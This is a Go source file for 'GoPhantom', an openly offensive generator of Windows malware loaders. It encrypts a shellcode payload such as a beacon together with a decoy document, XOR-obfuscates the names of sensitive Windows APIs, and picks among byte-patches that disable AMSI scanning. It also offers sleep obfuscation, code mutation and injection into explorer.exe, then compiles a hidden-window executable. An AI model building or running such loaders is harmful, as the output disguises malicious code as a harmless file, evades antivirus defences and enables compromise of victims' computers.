package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"embed"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/watanabe-hsad/GoPhantom/internal/keymgr"
	"io"
	"log"
	mrand "math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

const logo = `
   ___        ___ _                 _
  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___
 / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \
/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|

          >> Advanced Payload Loader Generator <<
                                        v1.5 by hsad
`

//go:embed templates/*.tmpl
var templateFS embed.FS

//go:embed build/go.mod.tmpl
var buildGoMod string

//go:embed build/go.sum
var buildGoSum string

type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Salt             string
	DecoyFileName    string
	EnableObfuscate  bool
	EnableMutate     bool
	EnableCompress   bool
	EnableInject     bool
	DelaySeconds     int
	// v2.1: 字符串混淆
	StringKey      byte
	EncodedStrings map[string]string
	// v2.1: AMSI patch 多态
	AMSIPatch string
}

// encodeString 对敏感字符串做 XOR 编码，编译时注入模板
func encodeString(s string, key byte) string {
	b := []byte(s)
	for i := range b {
		b[i] ^= key
	}
	return base64.StdEncoding.EncodeToString(b)
}

// generateStringKey 生成随机 XOR 密钥（避开 0x00）
func generateStringKey() byte {
	b := make([]byte, 1)
	for {
		rand.Read(b)
		if b[0] != 0 {
			return b[0]
		}
	}
}

// selectAMSIPatch 随机选择一种等效 AMSI patch
func selectAMSIPatch() string {
	patches := [][]byte{
		{0x31, 0xC0, 0xC3},                         // xor eax,eax; ret (S_OK=0)
		{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3},       // mov eax,E_INVALIDARG; ret
		{0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3},       // mov eax,1; ret (AMSI_RESULT_CLEAN)
	}
	idx := mrand.Intn(len(patches))
	return base64.StdEncoding.EncodeToString(patches[idx])
}

// buildEncodedStrings 预编码所有敏感字符串
func buildEncodedStrings(key byte) map[string]string {
	sensitive := []string{
		"kernel32.dll",
		"ntdll.dll",
		"user32.dll",
		"advapi32.dll",
		"shell32.dll",
		"amsi.dll",
		"C:\\Windows\\System32\\ntdll.dll",
		"CreateFileA",
		"ReadFile",
		"GetFileSize",
		"CloseHandle",
		"VirtualProtect",
		"GetModuleHandleA",
		"EtwEventWrite",
		"NtTraceEvent",
		"AmsiScanBuffer",
		"IsDebuggerPresent",
		"CheckRemoteDebuggerPresent",
		"GetCurrentProcess",
		"NtQueryInformationProcess",
		"RegOpenKeyExA",
		"RegCloseKey",
		"CreateToolhelp32Snapshot",
		"Process32FirstW",
		"Process32NextW",
		"GetCurrentThread",
		"GetThreadContext",
		"GetSystemInfo",
		"GlobalMemoryStatusEx",
		"GetDiskFreeSpaceExA",
		"GetTickCount64",
		"GetLastInputInfo",
		"GetTickCount",
		"GetSystemMetrics",
		"SHGetFolderPathA",
		"FindFirstFileA",
		"FindNextFileA",
		"FindClose",
		"GetModuleFileNameW",
		"GetEnvironmentVariableW",
		"GetUserNameW",
		"GetComputerNameW",
		"QueryFullProcessImageNameW",
		"OpenProcess",
		"NtAllocateVirtualMemory",
		"VirtualAlloc",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx",
		"CreateThread",
		"WaitForSingleObject",
		"EnumChildWindows",
		"GetDesktopWindow",
		"VirtualAllocEx",
		"WriteProcessMemory",
		"NtWriteVirtualMemory",
		"VirtualProtectEx",
		"CreateRemoteThread",
		"ShellExecuteA",
		"GetCurrentProcessId",
		"GetSystemTimeAsFileTime",
		"QueryPerformanceCounter",
		"GetCurrentThreadId",
	}
	m := make(map[string]string, len(sensitive))
	for _, s := range sensitive {
		m[s] = encodeString(s, key)
	}
	return m
}

func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, error) {
	data := make([]byte, len(plaintext))
	copy(data, plaintext)

	// XOR加密层 (使用AES密钥前8字节)
	xorKey := key[:8]
	for i := range data {
		data[i] ^= xorKey[i%8]
	}
	
	// 如果启用压缩，先压缩数据
	if enableCompress {
		var compressedBuf bytes.Buffer
		writer := zlib.NewWriter(&compressedBuf)
		if _, err := writer.Write(data); err != nil {
			return "", err
		}
		if err := writer.Close(); err != nil {
			return "", err
		}
		data = compressedBuf.Bytes()
	}
	
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func main() {
	// 确保在 Windows 上也能正常显示输出
	log.SetFlags(0)
	
	// 定义所有标志
	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	outputFile := flag.String("out", "", "Required: Final output executable name.")
	enableObfuscate := flag.Bool("obfuscate", false, "Optional: Enable sleep-obfuscation in generated loader.")
	enableMutate := flag.Bool("mutate", false, "Optional: Enable shellcode mutation with random NOPs.")
	enableCompress := flag.Bool("compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
	enableInject := flag.Bool("inject", false, "Optional: Enable process injection mode (inject into explorer.exe etc).")
	delaySeconds := flag.Int("delay", 0, "Optional: Delay N seconds before payload execution.")
	
	// 自定义用法信息
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "%s\n", logo)
		fmt.Fprintf(os.Stderr, "Usage: %s [OPTIONS]\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Required flags:\n")
		fmt.Fprintf(os.Stderr, "  -decoy string\n        Path to the decoy file (e.g., a PDF or image)\n")
		fmt.Fprintf(os.Stderr, "  -payload string\n        Path to the raw x64 shellcode file (e.g., beacon.bin)\n")
		fmt.Fprintf(os.Stderr, "  -out string\n        Final output executable name\n\n")
		fmt.Fprintf(os.Stderr, "Optional flags:\n")
		fmt.Fprintf(os.Stderr, "  -compress\n        Enable zlib compression of embedded data (default: true)\n")
		fmt.Fprintf(os.Stderr, "  -delay int\n        Delay N seconds before payload execution (default: 0)\n")
		fmt.Fprintf(os.Stderr, "  -obfuscate\n        Enable sleep-obfuscation in generated loader\n")
		fmt.Fprintf(os.Stderr, "  -mutate\n        Enable shellcode mutation with random NOPs\n")
		fmt.Fprintf(os.Stderr, "  -inject\n        Enable process injection mode (inject into explorer.exe etc)\n")
		fmt.Fprintf(os.Stderr, "  -h, --help\n        Show this help message\n\n")
		fmt.Fprintf(os.Stderr, "Example:\n")
		fmt.Fprintf(os.Stderr, "  %s -decoy document.pdf -payload beacon.bin -out loader.exe\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s -decoy image.jpg -payload calc.bin -out calc_loader.exe -obfuscate -mutate -inject -delay 30\n\n", os.Args[0])
	}
	
	// 检查帮助参数
	if len(os.Args) > 1 && (os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "-help") {
		flag.Usage()
		return
	}
	
	log.Print(logo)
	flag.Parse()

	if *decoyFile == "" || *payloadFile == "" || *outputFile == "" {
		fmt.Fprintf(os.Stderr, "\n❌ Error: Missing required parameters!\n\n")
		if *decoyFile == "" {
			fmt.Fprintf(os.Stderr, "Missing -decoy: Please specify a decoy file path\n")
		}
		if *payloadFile == "" {
			fmt.Fprintf(os.Stderr, "Missing -payload: Please specify a shellcode file path\n") 
		}
		if *outputFile == "" {
			fmt.Fprintf(os.Stderr, "Missing -out: Please specify an output file name\n")
		}
		fmt.Fprintf(os.Stderr, "\nUse '%s -h' for help.\n\n", os.Args[0])
		os.Exit(1)
	}

	decoyBytes, err := os.ReadFile(*decoyFile)
	if err != nil {
		log.Fatalf("[-] Failed to read decoy file: %v", err)
	}
	shellcodeBytes, err := os.ReadFile(*payloadFile)
	if err != nil {
		log.Fatalf("[-] Failed to read payload file: %v", err)
	}

	log.Println("[+] Deriving AES-256 key using Argon2id...")
	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
	if err != nil {
		log.Fatalf("[-] Failed to derive key and salt: %v", err)
	}

	log.Println("[+] Encrypting decoy file with derived key...")
	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey, *enableCompress)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
	}

	log.Println("[+] Encrypting payload file with the same derived key...")
	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey, *enableCompress)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
	}

	log.Println("[+] Generating string obfuscation key and AMSI patch variant...")
	strKey := generateStringKey()
	encodedStrings := buildEncodedStrings(strKey)
	amsiPatch := selectAMSIPatch()

	data := TemplateData{
		EncryptedPayload: encryptedShellcode,
		EncryptedDecoy:   encryptedDecoy,
		Salt:             base64.StdEncoding.EncodeToString(salt),
		DecoyFileName:    filepath.Base(*decoyFile),
		EnableObfuscate:  *enableObfuscate,
		EnableMutate:     *enableMutate,
		EnableCompress:   *enableCompress,
		EnableInject:     *enableInject,
		DelaySeconds:     *delaySeconds,
		StringKey:        strKey,
		EncodedStrings:   encodedStrings,
		AMSIPatch:        amsiPatch,
	}

	log.Println("[+] Generating loader source code...")
	tmpl, err := template.New("loader.go.tmpl").ParseFS(templateFS, "templates/*.tmpl")
	if err != nil {
		log.Fatalf("[-] Failed to parse loader templates: %v", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		log.Fatalf("[-] Failed to execute template: %v", err)
	}

	// 创建临时工作目录（避免Go忽略系统temp根目录的go.mod）
	tmpDir, err := os.MkdirTemp("", "gophantom-build-*")
	if err != nil {
		log.Fatalf("[-] Failed to create temp directory: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	tmpGoFile := filepath.Join(tmpDir, "loader.go")
	if err := os.WriteFile(tmpGoFile, sourceCode.Bytes(), 0644); err != nil {
		log.Fatalf("[-] Failed to write loader source: %v", err)
	}
	
	// 创建临时 go.mod 和 go.sum
	goModPath := filepath.Join(tmpDir, "go.mod")
	if err := os.WriteFile(goModPath, []byte(buildGoMod), 0644); err != nil {
		log.Fatalf("[-] Failed to create temp go.mod: %v", err)
	}
	goSumPath := filepath.Join(tmpDir, "go.sum")
	if err := os.WriteFile(goSumPath, []byte(buildGoSum), 0644); err != nil {
		log.Fatalf("[-] Failed to create temp go.sum: %v", err)
	}

	log.Printf("[+] Cross-compiling for windows/amd64...")
	
	// 显示启用的功能
	var features []string
	if *enableCompress {
		features = append(features, "Data Compression")
	}
	if *enableObfuscate {
		features = append(features, "Sleep Obfuscation")
	}
	if *enableMutate {
		features = append(features, "Code Mutation")
	}
	if *enableInject {
		features = append(features, "Process Injection")
	}
	if *delaySeconds > 0 {
		features = append(features, fmt.Sprintf("Delay %ds", *delaySeconds))
	}
	
	if len(features) > 0 {
		log.Printf("[+] Optional features: %v", features)
	}

	ldflags := "-s -w -H windowsgui"
	// 使用绝对路径作为输出文件
	absOutputFile, err := filepath.Abs(*outputFile)
	if err != nil {
		log.Fatalf("[-] Failed to get absolute path: %v", err)
	}
	
	if filepath.Ext(absOutputFile) == "" {
		absOutputFile = absOutputFile + ".exe"
	}
	
	// 编译 x64 版本
	log.Printf("[+] Building x64 version...")
	output64 := absOutputFile
	cmd64 := exec.Command("go", "build", "-mod=mod", "-o", output64, "-ldflags", ldflags, "loader.go")
	cmd64.Dir = tmpDir
	
	env64 := os.Environ()
	env64 = append(env64, "CGO_ENABLED=0")
	env64 = append(env64, "GOOS=windows")
	env64 = append(env64, "GOARCH=amd64")
	cmd64.Env = env64

	output, err := cmd64.CombinedOutput()
	if err != nil {
		log.Printf("[-] x64 Compilation failed: %v", err)
		if len(output) > 0 {
			log.Printf("[-] Compiler output:\n%s", string(output))
		}
		os.Exit(1)
	}
	log.Printf("[✓] x64 build complete: %s", output64)

	log.Printf("\n[✓] Successfully generated GoPhantom v1.5 loader!")
	log.Printf("    Output: %s", output64)
}
